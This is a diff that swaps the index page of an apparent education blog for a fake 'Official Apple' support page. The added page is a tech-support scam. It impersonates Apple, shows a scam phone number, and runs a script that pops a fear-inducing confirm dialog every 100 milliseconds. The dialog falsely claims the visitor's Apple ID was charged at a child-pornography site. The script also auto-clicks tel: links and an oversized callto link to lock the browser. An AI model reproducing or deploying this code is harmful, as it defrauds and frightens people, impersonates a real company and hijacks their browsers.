@@ -1,11 +1,375 @@
-<html><head><meta charset="UTF-8" class="btn-EsToOwV"/><link rel="stylesheet" href="styles.css" class="big-wQXUUPHJ"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="xl-RNJrWpKQweLqxsog"/><meta name="referrer" content="no-referrer" class="big-OuiFbHITwInjDi"/><style> @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@200..700&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #4e484f; border-radius: 13px; } *::-webkit-scrollbar-thumb { background-color: #d6e4a3; border-radius: 13px; border: 3px solid #4e484f; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>eduniva.site</title>
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="small-nspazRaLhOvKNtXX"><main class="headline-aGOQTseGghgGaUz"><div class="inner-bsNsatJsb"><div class="big-WhNeqJOf"><div class="text-ZoStmHBNhtKg"><h3 class="title-qkLcwWT">eduniva.site</h3><span class="avatar-JPfSyYwylFhNUW">This article Writing Teaching discusses Literacy the significance of STEM education Academic Innovation in Learning Examination Study cultivating Certification innovation and problem-solving skills Knowledge among students, along Skills with practical Training Curriculum strategies for Reading implementation. Research</span></div><div class="wrapper-soxskhWTUFvILfp"><a href="themelist0.html" class="more-UvwCvKKVbtyN"><span class="box-TLyyGYXGUTVh">Read full</span></a><a href="index.php" class="image-XGVksJ"><span class="section-WwHKKorMDrPqK">Tell others</span></a></div></div></div><div class="img-MJOUAcaYYDga"><div class="subtitle-LGPTvUtjyOsNHle"><div class="holder-lYvLhGfYqmE"><h3 class="tooltip-OAQLPFHtjigW">Visuals collection</h3></div></div><div class="more-pLXIPcgtBZK"><div class="wide-OROCdzefOsIhYp"><img src="./img/adfeaf6575ede585a70858c0accce9eab58df6aa.jpg" class="lg-QzcmiSmGKzlToQ"/><img src="./img/2af969fe677af7cc26d32beb68c3abc23fa708cf.jpg" class="desc-JyYqRBS"/><img src="./img/262a672b152cf7b715da3bec672b6ba9d7fe4d8e.jpg" class="avatar-DYRqiZQcsjM"/><img src="./img/e13bc33fb1c53416b5b3e781637b2c101817453f.jpg" class="avatar-CaqeMFxkrbTDnK"/><img src="./img/2f9ff5f334427617cf75d8633577472551ba23e7.jpg" class="sm-mjoHlfNCi"/><img src="./img/e2289a73c6545b38efa3a7f449da0a1c18f2d665.jpg" class="heading-gNKeudtYXfR"/><img src="./img/6526283f40741e6819c1b2861085bc5090b92c31.jpg" class="desc-BfEvBkuz"/><img src="./img/f60edbf30d80a6ba42d4d9f358f4afa4644332f4.jpg" class="container-XMImpcSNxTVZAmf"/><img src="./img/c71a27bf087af0cf738ea07ffc276f8285231458.jpg" class="caption-CuvVJvfgsBIx"/><img src="./img/199469ad096cbf541c8d88beb7314d57cddeeb2a.jpg" class="img-HNtLJRRC"/></div></div></div><div class="row-HUnezJTJqVnqPRwt"><div class="narrow-YkbrHKnGVOIv"><div class="medium-BvPBGTyxu"><div class="desc-qhjBRQhjtySol"><div class="thumb-sRYPJzo"><div class="medium-kDQTrHUacuWhfY"><div class="page-gdsBQkWFRj"><span class="button-SsGSDExv">12/05/24</span></div></div><div class="userpic-kfctHSDg"><div class="holder-BSpVwPteuElkqEY"><span class="control-KxlBijmCe">Sophie Martinez</span></div></div></div><div class="grid-POtJcO"><a href="themelist1.html" class="active-QeFeiyhv"><span class="container-XfaXdSjKoIChzMMz">Open article</span></a></div><div class="subtitle-YUIsMsswAVzrz"><h5 class="sm-CbRHIFJTok">Ergonomic Desks for Healthy Learning: Designing for Comfort and Productivity</h5><div class="all-dQLpLgcHcJchUf"><span class="picture-jSVZtzTnQAYuA">This Certification article Knowledge explores Skills the importance Academic of Study ergonomic desk designs in educational settings, emphasizing how proper desk ergonomics Research Teaching Curriculum promote healthy posture, Literacy reduce strain, Innovation Writing and enhance Reading student Training well-being and productivity. Learning Examination</span></div></div></div><div class="more-BgbQLsDgMgbf"><div class="sidebar-FfXsWIIygl"><img src="./img/bf8a29fe74d0b2c38ae3448262bfb094f24cb441.jpg" class="sidebar-CfAWGOcWrXDkqy"/></div></div></div><div class="page-KgqfWoPGVahpYTia"><div class="wrapper-BMXudrsQgZgYevJ"><div class="more-rNBUURzOCvYltY"><div class="wrapper-IVczBopbSPoeBOA"><div class="tiny-FoAMPkw"><span class="userpic-zRUOraY">06/13/25</span></div></div><div class="column-xGwFiw"><div class="container-COVEZb"><span class="image-qEaIqwfOCEboESHf">Daniela Rossi</span></div></div></div><div class="thumbnail-gruLRkhWRJ"><a href="themelist2.html" class="subject-PhePMEhkIPNKw"><span class="sm-BlfnsZk">Open article</span></a></div><div class="title-pNkevUIBbIDKMYb"><h5 class="desc-rBeIzVNsCWADYOAA">Cultivating Emotional Intelligence in Education</h5><div class="xs-PcgSsr"><span class="icon-pXliOPEwEy">Skills An Study Research Innovation Certification exploration Learning Teaching of the Examination Academic importance Knowledge Reading of Curriculum emotional intelligence in schools Literacy and effective strategies for Writing Training fostering it.</span></div></div></div><div class="grid-tqTBxEEjNFA"><div class="current-JrjRJPSavLMZA"><img src="./img/419231cd69574cbcb099fdb2f56e571436c2bbbf.jpg" class="section-mozBHz"/></div></div></div><div class="widget-NoQxZBRH"><div class="image-UgvNOtDJCAMLope"><div class="thumb-pVShZv"><div class="inner-zJGVEngE"><div class="tip-tQvtcfg"><span class="btn-UXhzCrN">12/07/24</span></div></div><div class="inner-VgwGXxnrgKW"><div class="big-WfRyBdX"><span class="title-WwCGlLdaVYp">Emily Carter</span></div></div></div><div class="button-XSVHAyIkcIynwE"><a href="themelist3.html" class="wrap-vLZtMaEUV"><span class="btn-MoqWYiTE">Open article</span></a></div><div class="breadcrumbs-qQrWEIYQcLEEV"><h5 class="more-lNytkfQJhub">Empowering Student Voice: The Key to Engaged Learning</h5><div class="xl-acrLkZ"><span class="icon-IDbfzUUCFvDSN">This article Writing discusses Study the importance of Teaching student Certification Knowledge voice Research Academic Training in Learning education and Reading Curriculum presents strategies for educators to empower students to Examination express Literacy their thoughts and Innovation Skills opinions.</span></div></div></div><div class="xl-lQJMaeXfmDf"><div class="wrap-uPCIzVdwyfrmnX"><img src="./img/f1cacdb8abd78d89293ddcfdf288b662a631d8da.jpg" class="preview-wmaMJXiS"/></div></div></div><div class="huge-vWDgUtqBJ"><div class="control-rvuDvCcIh"><div class="desc-KMQaotk"><div class="md-hvkvAsdlFioPxaH"><div class="holder-wfigtysfmBQB"><span class="thumbnail-YlWFTq">01/09/25</span></div></div><div class="huge-ddfUJtiJnZD"><div class="page-lxAygOcknuAsdFfS"><span class="more-pZbcyaAfIBedoYwT">Lucas Thompson</span></div></div></div><div class="tagline-YtibuoVAX"><a href="themelist4.html" class="icon-aWGZxpQf"><span class="section-lfFsJS">Open article</span></a></div><div class="wrap-DIzKPEXxNF"><h5 class="button-wBtAbOXjZKGcNCCN">Harnessing the Power of Mindfulness in Education</h5><div class="box-TpfviTXyM"><span class="narrow-PBHOTYdbaCB">This article Teaching Reading examines Examination the benefits of mindfulness practices in Literacy educational settings, highlighting Learning Academic Study how Knowledge they can enhance student Innovation Research well-being, Curriculum focus, and Training academic Certification Skills performance. Writing</span></div></div></div><div class="narrow-WdzrnvJp"><div class="thumb-BPPueADLwBhHwjk"><img src="./img/c1bb75dcb46b146703c3db7b28534bbb837442c9.jpg" class="wrap-SnPHqIEBp"/></div></div></div><div class="large-SoDRKI"><div class="picture-DMLFghYX"><div class="headline-UuIIymnI"><div class="pic-ZrujghwEVbZxE"><div class="subtitle-ARNZCFn"><span class="row-jzYfju">02/23/25</span></div></div><div class="more-YvSjdG"><div class="picture-LPibVMQVZACWFuE"><span class="control-VZQNkwPHyVSkuzHz">Liam Johnson</span></div></div></div><div class="col-nRqReewyrieXPSPu"><a href="themelist5.html" class="column-MnjTgyyEO"><span class="thumbnail-kBZrfRhDO">Open article</span></a></div><div class="column-TVTycuSkPTYNPZU"><h5 class="xl-jSFYgtmw">The Future of Remote Work: Trends and Innovations</h5><div class="huge-IpPIoeFETKaC"><span class="medium-iznJGxxWKdtJMw">Teaching Reading This Curriculum Skills article Training explores the Academic evolving landscape of remote work, examining current Knowledge Examination trends, technological innovations, and Certification Literacy Learning the implications for the Writing Study future Innovation of Research the workforce.</span></div></div></div><div class="all-eYiboZiXFXNDF"><div class="btn-aSYskqs"><img src="./img/344a42cda5946cdd3d1ee0575759a80ca8544e61.jpg" class="huge-mcVAYNNtRplgUrf"/></div></div></div><div class="aside-CZMxoYruUDefSoqB"><div class="preview-HSbXgc"><div class="small-GkZLEf"><div class="desc-RrgNrZZKrxEX"><div class="more-mrsQHlTxl"><span class="widget-HsRLaCggaKOmMR">11/19/24</span></div></div><div class="title-DXUrpqlrm"><div class="container-oxTSvg"><span class="image-BpLfmRH">Lucas Thompson</span></div></div></div><div class="big-UCUVJjuGy"><a href="themelist6.html" class="aside-juhYwY"><span class="active-RKkBgqtoLKJnYLAR">Open article</span></a></div><div class="small-tWhVvZmDKOmzdY"><h5 class="grid-xCoFCCwicYYQIr">The Evolving Landscape of Libraries in the Digital Age</h5><div class="xl-BWyybQinFYTHj"><span class="narrow-lXnpVpSPZL">Literacy An exploration of how Academic Reading libraries adapt to Teaching technological Writing Certification Learning advancements while Study continuing Innovation to serve their Examination Skills Training communities Knowledge and promote Research education. Curriculum</span></div></div></div><div class="preview-MSZOvVHTHBpfjv"><div class="userpic-hqNYUiDo"><img src="./img/847d5dd09df7762ea040bbd5d0041356280bd8e4.jpg" class="picture-jPjyfEYDsfSmnx"/></div></div></div><div class="xl-YiorUDIbVdqZ"><div class="active-umUcvdDuZU"><div class="aside-lTOVAKNyixrKcMcA"><div class="sidebar-EFonnrxLnQNTK"><div class="page-vKPHwqQTVX"><span class="wrapper-rzAchYKCz">12/17/24</span></div></div><div class="box-wAqWRAbelsIokI"><div class="current-yTxAVaQfFGbo"><span class="widget-uPsOqreggKvA">Michael Thompson</span></div></div></div><div class="tooltip-oPRIpdvkZeszActw"><a href="themelist7.html" class="desc-RuPvSTqtd"><span class="column-kShobdvHaCr">Open article</span></a></div><div class="sidebar-ZFOlmeVhLIjV"><h5 class="section-NEpRQofhy">Embracing Diversity in Education</h5><div class="all-xhevaocygw"><span class="current-XRVMbFSryHCE">This Skills Teaching Writing Training article discusses the importance of Examination diversity in educational Study settings, exploring Knowledge how Academic inclusive practices Literacy Innovation enhance Learning learning and Reading Research Curriculum promote a sense Certification of belonging among students.</span></div></div></div><div class="sidebar-kUrsIOxpHF"><div class="subtitle-xtJjyMVH"><img src="./img/c64f8b0ea6d2203a81996f7d739e04db8bdaa8ec.jpg" class="caption-CoKYKViANZcoP"/></div></div></div><div class="column-yAzURQCZq"><div class="current-PfDrnkyMXHPjQz"><div class="breadcrumbs-HlhKubmda"><div class="grid-gsUunugdxU"><div class="breadcrumbs-MJVxTi"><span class="caption-ZoamLRnCfj">03/27/25</span></div></div><div class="headline-JxQQYNYpadSKzdN"><div class="large-ulTdmENrIi"><span class="preview-DZxbrDZff">Lucas Chen</span></div></div></div><div class="big-TOniGhr"><a href="themelist8.html" class="avatar-mhZBdHrelqkZbPCl"><span class="current-hRUThNAPab">Open article</span></a></div><div class="lg-BgeScG"><h5 class="icon-KLwSElrPpgP">Harnessing the Art of Writing for Lifelong Learning</h5><div class="picture-IMYDUb"><span class="pic-iaVKpqhwHocoxsv">This article discusses Literacy the importance of various Curriculum Writing Reading Innovation writing Certification styles in Research Teaching fostering effective Skills Study Learning Examination Training Knowledge learning and personal development in Academic educational environments.</span></div></div></div><div class="section-ypHMzFic"><div class="col-agRAKhxy"><img src="./img/1a5e55aeeddb90a2594633f268e26f6e92a1fce4.jpg" class="avatar-OrHRnyrnZfEoe"/></div></div></div><div class="xs-OcLWrHtj"><div class="heading-YwMchnegPpz"><div class="breadcrumbs-cuTvddx"><div class="large-URKPInfvYYwUP"><div class="caption-DhuaTM"><span class="control-tMCvJE">01/29/25</span></div></div><div class="subject-FfPTUmOaiFRtxtD"><div class="wrapper-goNHaif"><span class="section-MhZsIVTSumhBBAx">Emma Schneider</span></div></div></div><div class="tip-FAfPdiTfWWLH"><a href="themelist9.html" class="userpic-fPYpjKzkfmxobYt"><span class="medium-ZVwLHre">Open article</span></a></div><div class="tip-icsFCKDV"><h5 class="col-lBDaHsNdR">Exploring the Diverse Functions of Libraries in Community Development</h5><div class="active-scwqizWdEAZpwLS"><span class="xl-YoHspfIUd">Writing This article delves into the various roles Study libraries Teaching Training Examination play Certification in Academic Literacy Knowledge community development, highlighting Skills their importance in fostering Learning Research education, culture, and Innovation Curriculum Reading social connections.</span></div></div></div><div class="xl-OugLtgZnC"><div class="sidebar-MgBYOnnPw"><img src="./img/9bd2c3dd6be7b98e8421704a0de99b97115631c9.jpg" class="caption-eTeWyoRxTSK"/></div></div></div><div class="tiny-ZnYsMsNrAeuIBRK"><div class="subtitle-vlmgIEwaAbTj"><div class="tagline-IahrMDaP"><div class="box-psBxkTde"><div class="button-wIQCqtZovQxNjiz"><span class="xs-hUvCnKFPLROJGgWS">09/18/24</span></div></div><div class="xs-RZlkDGnls"><div class="wrap-RInCKZX"><span class="grid-irSTvwVhUnQKoz">Sofia Martinez</span></div></div></div><div class="heading-YUFsyoUpH"><a href="themelist10.html" class="container-PkRXDf"><span class="wrapper-oElrjvWPBsqdoAV">Open article</span></a></div><div class="img-RmOPIXYNLSWVVx"><h5 class="small-hGcHiivTsbWH">Embracing Technology in Education: Transforming Learning for the Future</h5><div class="box-IluGNLuqMMKhgf"><span class="box-FiHnCU">This article explores the Study Teaching integration Reading of technology Learning in Writing education, Skills examining its Certification Curriculum benefits, Training challenges, and Innovation the Academic future of Research learning Knowledge in Literacy Examination a digital world.</span></div></div></div><div class="huge-GWDMbKgR"><div class="section-WOMKcpvmkdXQkqA"><img src="./img/a85fb5498f1f9a8b4f42a2c64b0b643179fb9c59.jpg" class="headline-grprGHrT"/></div></div></div></div></div></main><footer class="picture-PhOHZXnp"><div class="content-QCvYPGFHCZYxxG"><a href="./privacy_policy.html" class="wrapper-PcnlSHxDrQn">Privacy Policy</a><a href="./terms_of_use.html" class="col-ELoJAGjDoS">Terms Of Use</a><a href="./cookie_policy.html" class="icon-DeFMkjRBr">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="picture-GdpFFdJHOWcCujNi"/><section class="container-vsdvWjqpj"><div class="userpic-RulUnon"><div class="image-xHOAYnQmOIV"><label for="close" class="inner-TrwHAfQyueqYJy"><span class="widget-yLSEEXPCVNU">Reject cookies</span></label></div><div class="headline-luxIhiwtvfyfDFv"><label for="close" class="widget-mCCDxgCd"><span class="medium-qNJOPOGoZzogRQa">Policy information</span></label></div><div class="thumb-TfkQmcF"><label for="close" class="title-dPksEfRm"><span class="wrapper-YzyJaA">Allow</span></label></div></div><div class="narrow-xQMdBPswSitou"><span class="xl-rAmtlABWP">We use cookies to improve your experience on our website. By using our website you consent cookies. Learn more.</span></div></section></body></html>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1(833) 926-3012 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CHÍLD P0RN0GRÀPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1(833) 926-3012
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1(833) 926-3012');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1(833) 926-3012"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1(833) 926-3012 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+</body>
+
+
+</html>
